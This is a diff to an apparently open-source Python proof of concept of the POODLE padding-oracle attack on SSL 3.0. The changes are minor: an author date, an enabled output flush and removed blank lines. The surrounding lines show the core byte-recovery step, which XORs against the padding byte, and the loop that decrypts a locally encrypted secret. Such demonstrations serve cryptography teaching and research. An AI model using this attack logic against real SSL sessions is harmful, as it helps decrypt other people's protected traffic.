@@ -4,8 +4,7 @@
 '''
     Poodle attack - PoC
     Implementation of the cryptography behind the attack
-    Author: mpgn <martial.puygrenier@gmail.com> - 2016
-    Update : 2018 - refactor to python3
+    Author: mpgn <martial.puygrenier@gmail.com> - 2018
 '''
 
 secret = []
@@ -78,10 +77,9 @@ def run_task(request, block, i, length_total):
         decipher_byte = chr(int("0f",16) ^ int(pbn[-2:],16) ^ int(pbi[-2:],16))
         secret[(16*block-i)-1] = decipher_byte
         sys.stdout.write('\r[+] [%s]' % ''.join(secret))
-        #sys.stdout.flush()
+        sys.stdout.flush()
         return decipher_byte
     return False
-
 
 '''
     the main attack start here
@@ -95,7 +93,6 @@ def split_len(seq, length):
 def run(SECRET):
     
     global secret
-
     length_block = 16
 
     # fill the last block with full padding 0f
@@ -122,12 +119,9 @@ def run(SECRET):
         while True:
             randkey()
             request = split_len(binascii.hexlify(encrypt("$"*16 + "#"*t + SECRET + "%"*((original_length//32-2)*length_block - char))), 32)
-            
-
             for block in range(original_length//32-2,0,-1):
                 if v1[block-1] == False:
                     v1[block-1] = run_task(request, block, char, length_total)
-
             if all(u for u in v1):
                 t += 1
                 v1 = [False] * (original_length//32-2)
